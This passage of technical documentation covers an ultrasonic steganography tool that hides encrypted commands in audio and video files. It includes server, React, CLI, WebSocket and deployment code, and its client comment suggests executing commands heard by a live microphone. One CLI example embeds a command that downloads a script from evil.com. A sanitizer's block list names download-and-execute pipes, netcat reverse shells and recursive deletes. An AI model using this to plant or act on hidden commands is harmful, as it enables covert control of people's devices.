// Configure multer for file uploads
const upload = multer({ 
    dest: 'uploads/',
    limits: { fileSize: 500 * 1024 * 1024 } // 500MB
});

// Embedding endpoint
app.post('/embed/audio', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
    }
    
    if (!req.body.command) {
        return res.status(400).json({ error: 'No command provided' });
    }
    
    const inputPath = req.file.path;
    const outputPath = `${inputPath}_embedded.mp3`;
    
    // Call Python script
    const pythonProcess = spawn('python3', [
        'embed_script.py',
        inputPath,
        outputPath,
        req.body.command
    ]);
    
    pythonProcess.on('close', (code) => {
        if (code === 0) {
            // Send embedded file
            res.download(outputPath, `embedded_${req.file.originalname}`, (err) => {
                if (!err) {
                    // Cleanup
                    fs.unlinkSync(inputPath);
                    fs.unlinkSync(outputPath);
                }
            });
        } else {
            res.status(500).json({ error: 'Embedding failed' });
            fs.unlinkSync(inputPath);
        }
    });
});

// Decoding endpoint
app.post('/decode/audio', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
    }
    
    const inputPath = req.file.path;
    
    // Call Python script
    const pythonProcess = spawn('python3', ['decode_script.py', inputPath]);
    
    let output = '';
    pythonProcess.stdout.on('data', (data) => {
        output += data.toString();
    });
    
    pythonProcess.on('close', (code) => {
        fs.unlinkSync(inputPath);
        
        if (code === 0) {
            try {
                const result = JSON.parse(output);
                res.json(result);
            } catch (e) {
                res.status(500).json({ error: 'Invalid response from decoder' });
            }
        } else {
            res.status(500).json({ error: 'Decoding failed' });
        }
    });
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
```

### React Frontend Integration

```jsx
import React, { useState } from 'react';
import axios from 'axios';

const SteganographyInterface = () => {
    const [file, setFile] = useState(null);
    const [command, setCommand] = useState('');
    const [isEmbedding, setIsEmbedding] = useState(false);
    const [isDecoding, setIsDecoding] = useState(false);
    const [decodedCommand, setDecodedCommand] = useState('');
    const [error, setError] = useState('');

    const handleFileChange = (e) => {
        setFile(e.target.files[0]);
        setError('');
    };

    const embedCommand = async () => {
        if (!file || !command) {
            setError('Please select a file and enter a command');
            return;
        }

        setIsEmbedding(true);
        setError('');

        const formData = new FormData();
        formData.append('file', file);
        formData.append('command', command);
        formData.append('obfuscate', 'true');

        try {
            const response = await axios.post('/api/embed/audio', formData, {
                responseType: 'blob',
                headers: {
                    'Content-Type': 'multipart/form-data',
                },
                timeout: 300000, // 5 minutes
            });

            // Download embedded file
            const url = window.URL.createObjectURL(new Blob([response.data]));
            const link = document.createElement('a');
            link.href = url;
            link.setAttribute('download', `embedded_${file.name}`);
            document.body.appendChild(link);
            link.click();
            link.remove();
            window.URL.revokeObjectURL(url);

        } catch (err) {
            setError(`Embedding failed: ${err.response?.data?.detail || err.message}`);
        } finally {
            setIsEmbedding(false);
        }
    };

    const decodeCommand = async () => {
        if (!file) {
            setError('Please select a file');
            return;
        }

        setIsDecoding(true);
        setError('');
        setDecodedCommand('');

        const formData = new FormData();
        formData.append('file', file);

        try {
            const response = await axios.post('/api/decode/audio', formData, {
                headers: {
                    'Content-Type': 'multipart/form-data',
                },
                timeout: 120000, // 2 minutes
            });

            if (response.data.success) {
                setDecodedCommand(response.data.command);
            } else {
                setError('No command found in the audio file');
            }

        } catch (err) {
            setError(`Decoding failed: ${err.response?.data?.detail || err.message}`);
        } finally {
            setIsDecoding(false);
        }
    };

    return (
        <div className="steganography-interface">
            <h2>Ultrasonic Steganography Tool</h2>
            
            <div className="file-input">
                <label>
                    Select Audio/Video File:
                    <input
                        type="file"
                        accept=".mp3,.wav,.flac,.ogg,.m4a,.mp4,.avi,.mov,.mkv"
                        onChange={handleFileChange}
                    />
                </label>
                {file && <p>Selected: {file.name}</p>}
            </div>

            <div className="embed-section">
                <h3>Embed Command</h3>
                <textarea
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    placeholder="Enter command to embed..."
                    rows="3"
                    cols="50"
                />
                <br />
                <button 
                    onClick={embedCommand} 
                    disabled={isEmbedding || !file || !command}
                >
                    {isEmbedding ? 'Embedding...' : 'Embed Command'}
                </button>
            </div>

            <div className="decode-section">
                <h3>Decode Command</h3>
                <button 
                    onClick={decodeCommand} 
                    disabled={isDecoding || !file}
                >
                    {isDecoding ? 'Decoding...' : 'Decode Command'}
                </button>
                
                {decodedCommand && (
                    <div className="decoded-result">
                        <h4>Decoded Command:</h4>
                        <pre>{decodedCommand}</pre>
                    </div>
                )}
            </div>

            {error && (
                <div className="error-message" style={{color: 'red'}}>
                    {error}
                </div>
            )}
        </div>
    );
};

export default SteganographyInterface;
```

### CLI Tool Integration

```python
#!/usr/bin/env python3
"""
Command-line interface for ultrasonic steganography.
"""

import argparse
import sys
import os
from pathlib import Path
import base64
import json

from agentic_commands_stego.crypto.cipher import CipherService
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from agentic_commands_stego.embed.video_embedder import VideoEmbedder
from agentic_commands_stego.decode.audio_decoder import AudioDecoder
from agentic_commands_stego.decode.video_decoder import VideoDecoder

def load_or_generate_key(key_file):
    """Load key from file or generate new one."""
    if key_file and os.path.exists(key_file):
        with open(key_file, 'r') as f:
            key_b64 = f.read().strip()
            return base64.b64decode(key_b64)
    else:
        key = CipherService.generate_key(32)
        if key_file:
            with open(key_file, 'w') as f:
                f.write(base64.b64encode(key).decode())
            print(f"Generated new key and saved to {key_file}")
        return key

def embed_command(args):
    """Embed command in media file."""
    # Load encryption key
    key = load_or_generate_key(args.key_file)
    
    # Determine file type
    file_ext = Path(args.input).suffix.lower()
    is_video = file_ext in ['.mp4', '.avi', '.mov', '.mkv']
    
    # Initialize embedder
    if is_video:
        embedder = VideoEmbedder(
            key=key,
            ultrasonic_freq=args.frequency,
            amplitude=args.amplitude
        )
        embedder.embed_file(
            args.input,
            args.output,
            args.command,
            obfuscate=args.obfuscate,
            audio_bitrate=args.bitrate
        )
    else:
        embedder = AudioEmbedder(
            key=key,
            ultrasonic_freq=args.frequency,
            amplitude=args.amplitude
        )
        embedder.embed_file(
            args.input,
            args.output,
            args.command,
            obfuscate=args.obfuscate,
            bitrate=args.bitrate
        )
    
    print(f"Command embedded successfully: {args.output}")

def decode_command(args):
    """Decode command from media file."""
    # Load encryption key
    key = load_or_generate_key(args.key_file)
    
    # Determine file type
    file_ext = Path(args.input).suffix.lower()
    is_video = file_ext in ['.mp4', '.avi', '.mov', '.mkv']
    
    # Initialize decoder
    if is_video:
        decoder = VideoDecoder(
            key=key,
            ultrasonic_freq=args.frequency,
            detection_threshold=args.threshold
        )
        command = decoder.decode_file(args.input)
        if args.analyze:
            analysis = decoder.analyze_video(args.input)
    else:
        decoder = AudioDecoder(
            key=key,
            ultrasonic_freq=args.frequency,
            detection_threshold=args.threshold
        )
        command = decoder.decode_file(args.input)
        if args.analyze:
            analysis = decoder.analyze_audio(args.input)
    
    if command:
        print(f"Decoded command: {command}")
        if args.output:
            with open(args.output, 'w') as f:
                f.write(command)
    else:
        print("No command found in file")
        sys.exit(1)
    
    if args.analyze:
        print(f"\nAnalysis results:")
        print(json.dumps(analysis, indent=2))

def analyze_command(args):
    """Analyze media file for steganographic content."""
    # Load encryption key
    key = load_or_generate_key(args.key_file)
    
    # Determine file type
    file_ext = Path(args.input).suffix.lower()
    is_video = file_ext in ['.mp4', '.avi', '.mov', '.mkv']
    
    # Initialize decoder
    if is_video:
        decoder = VideoDecoder(key=key)
        analysis = decoder.analyze_video(args.input)
    else:
        decoder = AudioDecoder(key=key)
        analysis = decoder.analyze_audio(args.input)
    
    print(json.dumps(analysis, indent=2))
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(analysis, f, indent=2)

def main():
    parser = argparse.ArgumentParser(description='Ultrasonic Steganography CLI')
    parser.add_argument('--key-file', '-k', help='Encryption key file')
    parser.add_argument('--frequency', '-f', type=float, default=18500,
                       help='Ultrasonic frequency (default: 18500)')
    
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Embed command
    embed_parser = subparsers.add_parser('embed', help='Embed command in media file')
    embed_parser.add_argument('input', help='Input media file')
    embed_parser.add_argument('output', help='Output media file')
    embed_parser.add_argument('command', help='Command to embed')
    embed_parser.add_argument('--amplitude', '-a', type=float, default=0.1,
                             help='Signal amplitude (default: 0.1)')
    embed_parser.add_argument('--bitrate', '-b', default='192k',
                             help='Audio bitrate (default: 192k)')
    embed_parser.add_argument('--no-obfuscate', action='store_true',
                             help='Disable obfuscation')
    embed_parser.set_defaults(func=embed_command)
    
    # Decode command
    decode_parser = subparsers.add_parser('decode', help='Decode command from media file')
    decode_parser.add_argument('input', help='Input media file')
    decode_parser.add_argument('--output', '-o', help='Output file for decoded command')
    decode_parser.add_argument('--threshold', '-t', type=float, default=0.01,
                              help='Detection threshold (default: 0.01)')
    decode_parser.add_argument('--analyze', action='store_true',
                              help='Show analysis results')
    decode_parser.set_defaults(func=decode_command)
    
    # Analyze command
    analyze_parser = subparsers.add_parser('analyze', help='Analyze media file')
    analyze_parser.add_argument('input', help='Input media file')
    analyze_parser.add_argument('--output', '-o', help='Output JSON file')
    analyze_parser.set_defaults(func=analyze_command)
    
    args = parser.parse_args()
    
    if args.command:
        # Process obfuscate flag
        if hasattr(args, 'no_obfuscate'):
            args.obfuscate = not args.no_obfuscate
        else:
            args.obfuscate = True
        
        args.func(args)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
```

Usage examples:
```bash
# Generate key and embed command
./stego_cli.py embed input.mp3 output.mp3 "wget http://evil.com/script.sh" -k key.txt

# Decode command
./stego_cli.py decode output.mp3 -k key.txt --analyze

# Analyze file without decoding
./stego_cli.py analyze suspicious.mp4 -o analysis.json
```

## WebSocket API

While the current implementation focuses on HTTP REST API, real-time processing can be implemented using WebSockets for streaming audio analysis.

### WebSocket Implementation Example

```python
from fastapi import WebSocket, WebSocketDisconnect
import asyncio
import json
import numpy as np
from agentic_commands_stego.decode.audio_decoder import AudioDecoder

class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
        self.decoders = {}
    
    async def connect(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.active_connections.append(websocket)
        # Initialize decoder for this connection
        self.decoders[client_id] = AudioDecoder(key=SECRET_KEY)
    
    def disconnect(self, websocket: WebSocket, client_id: str):
        self.active_connections.remove(websocket)
        if client_id in self.decoders:
            del self.decoders[client_id]

manager = ConnectionManager()

@app.websocket("/ws/realtime/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await manager.connect(websocket, client_id)
    decoder = manager.decoders[client_id]
    
    try:
        while True:
            # Receive audio data
            data = await websocket.receive_bytes()
            
            # Convert to numpy array (assumes 16-bit PCM)
            audio_array = np.frombuffer(data, dtype=np.int16).astype(np.float32)
            audio_array = audio_array / 32768.0  # Normalize
            
            # Check for signal
            has_signal = decoder.detect_signal_presence(audio_array)
            signal_strength = decoder.get_signal_strength(audio_array)
            
            # Try to decode
            command = None
            if has_signal:
                command = decoder._decode_audio_data(audio_array)
            
            # Send results
            result = {
                "has_signal": has_signal,
                "signal_strength": signal_strength,
                "command": command,
                "timestamp": time.time()
            }
            
            await websocket.send_text(json.dumps(result))
            
    except WebSocketDisconnect:
        manager.disconnect(websocket, client_id)
```

### WebSocket Client Example

```javascript
class RealtimeSteganographyClient {
    constructor(clientId, wsUrl = 'ws://localhost:8000/ws/realtime/') {
        this.clientId = clientId;
        this.wsUrl = wsUrl + clientId;
        this.websocket = null;
        this.mediaRecorder = null;
        this.audioStream = null;
    }
    
    async connect() {
        return new Promise((resolve, reject) => {
            this.websocket = new WebSocket(this.wsUrl);
            
            this.websocket.onopen = () => {
                console.log('WebSocket connected');
                resolve();
            };
            
            this.websocket.onmessage = (event) => {
                const data = JSON.parse(event.data);
                this.handleResult(data);
            };
            
            this.websocket.onerror = (error) => {
                console.error('WebSocket error:', error);
                reject(error);
            };
            
            this.websocket.onclose = () => {
                console.log('WebSocket disconnected');
            };
        });
    }
    
    async startListening() {
        try {
            // Get microphone access
            this.audioStream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    sampleRate: 48000,
                    channelCount: 1,
                    echoCancellation: false,
                    noiseSuppression: false
                }
            });
            
            // Create media recorder
            this.mediaRecorder = new MediaRecorder(this.audioStream, {
                mimeType: 'audio/webm;codecs=pcm'
            });
            
            this.mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0 && this.websocket.readyState === WebSocket.OPEN) {
                    // Convert blob to array buffer and send
                    event.data.arrayBuffer().then(buffer => {
                        this.websocket.send(buffer);
                    });
                }
            };
            
            // Start recording in chunks
            this.mediaRecorder.start(100); // 100ms chunks
            
        } catch (error) {
            console.error('Error starting audio capture:', error);
        }
    }
    
    stopListening() {
        if (this.mediaRecorder) {
            this.mediaRecorder.stop();
        }
        
        if (this.audioStream) {
            this.audioStream.getTracks().forEach(track => track.stop());
        }
    }
    
    handleResult(data) {
        console.log('Analysis result:', data);
        
        if (data.command) {
            console.log('🎯 Command detected:', data.command);
            // Handle detected command
            this.onCommandDetected(data.command);
        }
        
        if (data.has_signal) {
            console.log('📡 Signal detected, strength:', data.signal_strength);
        }
    }
    
    onCommandDetected(command) {
        // Override this method to handle detected commands
        alert(`Command detected: ${command}`);
    }
    
    disconnect() {
        this.stopListening();
        
        if (this.websocket) {
            this.websocket.close();
        }
    }
}

// Usage
const client = new RealtimeSteganographyClient('user123');

client.onCommandDetected = (command) => {
    document.getElementById('detected-command').textContent = command;
    // Execute command or take other action
};

// Connect and start listening
client.connect().then(() => {
    client.startListening();
});
```

## Best Practices

### Security Best Practices

#### Key Management

```python
import os
import keyring
from cryptography.fernet import Fernet

class SecureKeyManager:
    """Secure key management using system keyring."""
    
    def __init__(self, service_name="ultrasonic_stego"):
        self.service_name = service_name
    
    def store_key(self, key_name, key_bytes):
        """Store encryption key securely."""
        key_b64 = base64.b64encode(key_bytes).decode()
        keyring.set_password(self.service_name, key_name, key_b64)
    
    def get_key(self, key_name):
        """Retrieve encryption key securely."""
        key_b64 = keyring.get_password(self.service_name, key_name)
        if key_b64:
            return base64.b64decode(key_b64)
        return None
    
    def delete_key(self, key_name):
        """Delete encryption key."""
        keyring.delete_password(self.service_name, key_name)

# Usage
key_manager = SecureKeyManager()
key = CipherService.generate_key(32)
key_manager.store_key("primary", key)

# Later retrieve
stored_key = key_manager.get_key("primary")
```

#### Input Validation

```python
import os
import magic
from pathlib import Path

class FileValidator:
    """Validate uploaded files for security."""
    
    ALLOWED_AUDIO_TYPES = {
        'audio/mpeg', 'audio/wav', 'audio/flac', 
        'audio/ogg', 'audio/mp4', 'audio/x-m4a'
    }
    
    ALLOWED_VIDEO_TYPES = {
        'video/mp4', 'video/avi', 'video/quicktime', 'video/x-msvideo'
    }
    
    MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB
    
    @classmethod
    def validate_file(cls, file_path, expected_type='audio'):
        """Validate file type and safety."""
        if not os.path.exists(file_path):
            raise ValueError("File does not exist")
        
        # Check file size
        file_size = os.path.getsize(file_path)
        if file_size > cls.MAX_FILE_SIZE:
            raise ValueError(f"File too large: {file_size} bytes")
        
        # Check MIME type using python-magic
        mime_type = magic.from_file(file_path, mime=True)
        
        if expected_type == 'audio':
            allowed_types = cls.ALLOWED_AUDIO_TYPES
        elif expected_type == 'video':
            allowed_types = cls.ALLOWED_VIDEO_TYPES
        else:
            raise ValueError("Invalid expected type")
        
        if mime_type not in allowed_types:
            raise ValueError(f"Invalid file type: {mime_type}")
        
        # Check for suspicious content (basic check)
        cls._check_suspicious_content(file_path)
        
        return True
    
    @classmethod
    def _check_suspicious_content(cls, file_path):
        """Basic check for suspicious file content."""
        # Read first few KB to check for suspicious patterns
        with open(file_path, 'rb') as f:
            header = f.read(8192)  # Read first 8KB
        
        # Check for executable signatures
        suspicious_patterns = [
            b'\x4d\x5a',  # PE executable
            b'\x7f\x45\x4c\x46',  # ELF executable
            b'\xfe\xed\xfa\xce',  # Mach-O executable
            b'#!/bin/',  # Shell script
        ]
        
        for pattern in suspicious_patterns:
            if pattern in header:
                raise ValueError("File contains suspicious executable content")

# Usage
try:
    FileValidator.validate_file('uploaded.mp3', 'audio')
    print("File is safe to process")
except ValueError as e:
    print(f"File validation failed: {e}")
```

#### Command Sanitization

```python
import re
import shlex

class CommandSanitizer:
    """Sanitize and validate embedded commands."""
    
    # Dangerous command patterns
    DANGEROUS_PATTERNS = [
        r'rm\s+-rf\s+/',  # Recursive delete
        r'sudo\s+',  # Privilege escalation
        r'wget\s+.*\|\s*sh',  # Download and execute
        r'curl\s+.*\|\s*bash',  # Download and execute
        r'eval\s+',  # Code evaluation
        r'exec\s+',  # Code execution
        r'mkfifo\s+',  # Named pipes
        r'nc\s+.*-e',  # Netcat reverse shell
        r'python.*-c.*exec',  # Python code execution
        r'perl.*-e',  # Perl code execution
    ]
    
    MAX_COMMAND_LENGTH = 1000
    
    @classmethod
    def validate_command(cls, command):
        """Validate command before embedding."""
        if not command or not isinstance(command, str):
            raise ValueError("Command must be a non-empty string")
        
        if len(command) > cls.MAX_COMMAND_LENGTH:
            raise ValueError(f"Command too long: {len(command)} characters")
        
        # Check for dangerous patterns
        for pattern in cls.DANGEROUS_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                raise ValueError(f"Command contains dangerous pattern: {pattern}")
        
        # Check for unusual characters
        if not cls._is_safe_command(command):
            raise ValueError("Command contains suspicious characters")
        
        return True
    
    @classmethod
    def _is_safe_command(cls, command):
        """Check if command contains only safe characters."""
        # Allow alphanumeric, common punctuation, and spaces
        safe_chars = set('abcdefghijklmnopqrstuvwxyz'
                        'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                        '0123456789'
                        ' ._-/\\:;,=@#$%&()[]{}+*?!~^')
        
        return all(c in safe_chars for c in command)
    
    @classmethod
    def sanitize_for_logging(cls, command):
        """Sanitize command for safe logging."""
        # Remove potentially sensitive information
        sanitized = re.sub(r'password[=\s]+\S+', 'password=***', command, flags=re.IGNORECASE)
        sanitized = re.sub(r'token[=\s]+\S+', 'token=***', sanitized, flags=re.IGNORECASE)
        sanitized = re.sub(r'key[=\s]+\S+', 'key=***', sanitized, flags=re.IGNORECASE)
        
        return sanitized

# Usage in embedding
try:
    CommandSanitizer.validate_command(user_command)
    embedder.embed_file(input_file, output_file, user_command)
    
    # Safe logging
    safe_cmd = CommandSanitizer.sanitize_for_logging(user_command)
    logger.info(f"Embedded command: {safe_cmd}")
    
except ValueError as e:
    logger.warning(f"Command validation failed: {e}")
    raise
```

### Performance Best Practices

#### Async Processing

```python
import asyncio
import aiofiles
from concurrent.futures import ThreadPoolExecutor
import queue
import threading

class AsyncSteganographyProcessor:
    """Asynchronous steganography processor for high throughput."""
    
    def __init__(self, max_workers=4):
        self.max_workers = max_workers
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.task_queue = asyncio.Queue()
        self.results = {}
        self.processing = False
    
    async def start_processing(self):
        """Start the async processing loop."""
        self.processing = True
        
        # Start worker tasks
        workers = [
            asyncio.create_task(self._worker(f"worker-{i}"))
            for i in range(self.max_workers)
        ]
        
        await asyncio.gather(*workers)
    
    async def _worker(self, worker_name):
        """Worker coroutine to process tasks."""
        while self.processing:
            try:
                task = await asyncio.wait_for(
                    self.task_queue.get(),
                    timeout=1.0
                )
                
                # Process task in thread pool
                result = await asyncio.get_event_loop().run_in_executor(
                    self.executor,
                    self._process_task,
                    task
                )
                
                # Store result
                self.results[task['id']] = result
                
                # Mark task as done
                self.task_queue.task_done()
                
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                print(f"Worker {worker_name} error: {e}")
    
    def _process_task(self, task):
        """Process a single task synchronously."""
        try:
            if task['type'] == 'embed':
                embedder = AudioEmbedder(key=task['key'])
                embedder.embed_file(
                    task['input_path'],
                    task['output_path'],
                    task['command']
                )
                return {'status': 'success', 'output_path': task['output_path']}
                
            elif task['type'] == 'decode':
                decoder = AudioDecoder(key=task['key'])
                command = decoder.decode_file(task['input_path'])
                return {'status': 'success', 'command': command}
                
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    async def submit_task(self, task):
        """Submit a task for processing."""
        task_id = f"task-{asyncio.get_event_loop().time()}"
        task['id'] = task_id
        
        await self.task_queue.put(task)
        return task_id
    
    async def get_result(self, task_id, timeout=30):
        """Get result for a task."""
        start_time = asyncio.get_event_loop().time()
        
        while asyncio.get_event_loop().time() - start_time < timeout:
            if task_id in self.results:
                return self.results.pop(task_id)
            
            await asyncio.sleep(0.1)
        
        raise asyncio.TimeoutError(f"Task {task_id} timed out")
    
    async def stop_processing(self):
        """Stop the processing loop."""
        self.processing = False
        await self.task_queue.join()
        self.executor.shutdown(wait=True)

# Usage
async def main():
    processor = AsyncSteganographyProcessor(max_workers=4)
    
    # Start processing in background
    processing_task = asyncio.create_task(processor.start_processing())
    
    try:
        # Submit embedding task
        task_id = await processor.submit_task({
            'type': 'embed',
            'input_path': 'input.mp3',
            'output_path': 'output.mp3',
            'command': 'echo test',
            'key': CipherService.generate_key(32)
        })
        
        # Get result
        result = await processor.get_result(task_id)
        print(f"Embedding result: {result}")
        
    finally:
        await processor.stop_processing()
        processing_task.cancel()

# Run the async example
# asyncio.run(main())
```

#### Memory Management

```python
import gc
import psutil
import os
from contextlib import contextmanager

class MemoryManager:
    """Memory management utilities for large file processing."""
    
    @staticmethod
    def get_memory_usage():
        """Get current memory usage in MB."""
        process = psutil.Process(os.getpid())
        return process.memory_info().rss / 1024 / 1024
    
    @staticmethod
    def check_available_memory():
        """Check available system memory in MB."""
        return psutil.virtual_memory().available / 1024 / 1024
    
    @contextmanager
    def memory_limit(max_memory_mb):
        """Context manager to enforce memory limits."""
        start_memory = MemoryManager.get_memory_usage()
        
        try:
            yield
        finally:
            current_memory = MemoryManager.get_memory_usage()
            memory_used = current_memory - start_memory
            
            if memory_used > max_memory_mb:
                print(f"Warning: Memory usage exceeded limit: {memory_used:.1f} MB")
            
            # Force garbage collection
            gc.collect()
    
    @staticmethod
    def estimate_memory_requirement(file_path):
        """Estimate memory required to process file."""
        file_size_mb = os.path.getsize(file_path) / 1024 / 1024
        
        # Rule of thumb: need 3-5x file size for processing
        estimated_mb = file_size_mb * 4
        
        return estimated_mb

# Usage
def safe_embedding_with_memory_check(input_path, output_path, command, key):
    """Perform embedding with memory management."""
    
    # Check memory requirements
    required_memory = MemoryManager.estimate_memory_requirement(input_path)
    available_memory = MemoryManager.check_available_memory()
    
    if required_memory > available_memory * 0.8:  # Use max 80% of available memory
        raise MemoryError(
            f"Insufficient memory: need {required_memory:.1f} MB, "
            f"available {available_memory:.1f} MB"
        )
    
    # Process with memory monitoring
    with MemoryManager.memory_limit(required_memory * 1.2):
        embedder = AudioEmbedder(key=key)
        embedder.embed_file(input_path, output_path, command)
    
    print(f"Processing completed. Final memory: {MemoryManager.get_memory_usage():.1f} MB")
```

#### Caching and Optimization

```python
import functools
import pickle
import hashlib
import os
from pathlib import Path

class ResultCache:
    """Cache for expensive operations."""
    
    def __init__(self, cache_dir="cache"):
        self.cache_dir = Path(cache_dir)
        self.cache_dir.mkdir(exist_ok=True)
    
    def _get_cache_key(self, func_name, *args, **kwargs):
        """Generate cache key from function arguments."""
        # Create hash of function name and arguments
        content = f"{func_name}:{str(args)}:{str(sorted(kwargs.items()))}"
        return hashlib.md5(content.encode()).hexdigest()
    
    def cache_result(self, func_name, result, *args, **kwargs):
        """Cache function result."""
        cache_key = self._get_cache_key(func_name, *args, **kwargs)
        cache_file = self.cache_dir / f"{cache_key}.pkl"
        
        with open(cache_file, 'wb') as f:
            pickle.dump(result, f)
    
    def get_cached_result(self, func_name, *args, **kwargs):
        """Get cached result if exists."""
        cache_key = self._get_cache_key(func_name, *args, **kwargs)
        cache_file = self.cache_dir / f"{cache_key}.pkl"
        
        if cache_file.exists():
            with open(cache_file, 'rb') as f:
                return pickle.load(f)
        
        return None
    
    def clear_cache(self):
        """Clear all cached results."""
        for cache_file in self.cache_dir.glob("*.pkl"):
            cache_file.unlink()

def cached_analysis(cache=None):
    """Decorator for caching analysis results."""
    if cache is None:
        cache = ResultCache()
    
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            # Check cache first
            cached_result = cache.get_cached_result(func.__name__, *args, **kwargs)
            if cached_result is not None:
                return cached_result
            
            # Compute result
            result = func(*args, **kwargs)
            
            # Cache result
            cache.cache_result(func.__name__, result, *args, **kwargs)
            
            return result
        
        return wrapper
    return decorator

# Usage
cache = ResultCache()

@cached_analysis(cache)
def analyze_audio_file(file_path, key):
    """Analyze audio file with caching."""
    decoder = AudioDecoder(key=key)
    return decoder.analyze_audio(file_path)

# First call computes result
result1 = analyze_audio_file('test.mp3', key)

# Second call returns cached result
result2 = analyze_audio_file('test.mp3', key)
```

### Production Deployment

#### Docker Configuration

```dockerfile
# Dockerfile
FROM python:3.9-slim

# Install system dependencies
RUN apt-get update && apt-get install -y \
    ffmpeg \
    libsndfile1 \
    portaudio19-dev \
    && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /app

# Copy requirements first for better caching
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY . .

# Create non-root user
RUN useradd -m -u 1000 stego && chown -R stego:stego /app
USER stego

# Expose port
EXPOSE 8000

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8000/health || exit 1

# Start application
CMD ["uvicorn", "agentic_commands_stego.server.api:app", "--host", "0.0.0.0", "--port", "8000"]
```

```yaml
# docker-compose.yml
version: '3.8'

services:
  stego-api:
    build: .
    ports:
      - "8000:8000"
    environment:
      - STEGO_SECRET_KEY=${STEGO_SECRET_KEY}
      - STEGO_MAX_FILE_SIZE=500MB
      - STEGO_LOG_LEVEL=INFO
    volumes:
      - ./uploads:/app/uploads
      - ./logs:/app/logs
    restart: unless-stopped
    
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./ssl:/etc/nginx/ssl
    depends_on:
      - stego-api
    restart: unless-stopped

  redis:
    image: redis:alpine
    restart: unless-stopped
    
volumes:
  uploads:
  logs:
```

#### Kubernetes Deployment

```yaml
# k8s-deployment.yml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ultrasonic-stego-api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: ultrasonic-stego-api
  template:
    metadata:
      labels:
        app: ultrasonic-stego-api
    spec:
      containers:
      - name: api
        image: ultrasonic-stego:latest
        ports:
        - containerPort: 8000
        env:
        - name: STEGO_SECRET_KEY
          valueFrom:
            secretKeyRef:
              name: stego-secrets
              key: secret-key
        resources:
          requests:
            memory: "512Mi"
            cpu: "250m"
          limits:
            memory: "2Gi"
            cpu: "1000m"
        livenessProbe:
          httpGet:
            path: /health
            port: 8000
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /health
            port: 8000
          initialDelaySeconds: 5
          periodSeconds: 5

---
apiVersion: v1
kind: Service
metadata:
  name: ultrasonic-stego-service
spec:
  selector:
    app: ultrasonic-stego-api
  ports:
  - port: 80
    targetPort: 8000
  type: ClusterIP

---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ultrasonic-stego-ingress
  annotations:
    nginx.ingress.kubernetes.io/proxy-body-size: "500m"
spec:
  rules:
  - host: stego-api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: ultrasonic-stego-service
            port:
              number: 80
```

## Troubleshooting

### Common Issues

#### FFmpeg Not Found

**Error**: `FFmpeg not found in PATH`

**Solutions**:
```bash
# Ubuntu/Debian
sudo apt-get install ffmpeg

# CentOS/RHEL
sudo yum install epel-release
sudo yum install ffmpeg

# macOS
brew install ffmpeg

# Windows
# Download from https://ffmpeg.org/download.html
# Add to PATH environment variable
```

#### Audio Quality Issues

**Problem**: Embedded commands not being detected

**Diagnostics**:
```python
# Check audio compatibility
from agentic_commands_stego.embed.audio_embedder import AudioEmbedder
from pydub import AudioSegment

embedder = AudioEmbedder()
audio = AudioSegment.from_file('test.mp3')
compatibility = embedder.validate_audio_compatibility(audio)

print(f"Compatible: {compatibility['compatible']}")
print(f"Sample rate: {compatibility['sample_rate']}")
print(f"Recommended: {compatibility['recommended_sample_rate']}")
```

**Solutions**:
- Increase sample rate to 48kHz or higher
- Use lossless formats (WAV, FLAC) for better quality
- Adjust amplitude settings
- Check frequency range compatibility

#### Memory Issues

**Error**: `MemoryError` or system freezing

**Solutions**:
```python
# Process large files in chunks
def process_large_file_chunked(file_path, chunk_size_mb=50):
    """Process large files in chunks."""
    file_size = os.path.getsize(file_path) / 1024 / 1024
    
    if file_size > chunk_size_mb:
        # Implement chunked processing
        # This is a simplified example
        print(f"File too large ({file_size:.1f} MB), use chunked processing")
        return False
    
    # Process normally
    return True
```

#### Permission Errors

**Error**: `PermissionError` on file operations

**Solutions**:
```python
import stat
import os

def fix_file_permissions(file_path):
    """Fix file permissions for processing."""
    try:
        # Make file readable and writable
        os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IROTH)
        return True
    except OSError as e:
        print(f"Cannot fix permissions: {e}")
        return False
```

### Debugging Tools

#### Signal Analysis

```python
import matplotlib.pyplot as plt
import numpy as np
from scipy import signal

def debug_ultrasonic_signal(audio_file, freq_0=18500, freq_1=19500):
    """Debug ultrasonic signal in audio file."""
    from pydub import AudioSegment
    
    # Load audio
    audio = AudioSegment.from_file(audio_file)
    audio_data = np.array(audio.get_array_of_samples(), dtype=np.float32)
    
    # Normalize
    if len(audio_data) > 0:
        audio_data = audio_data / np.max(np.abs(audio_data))
    
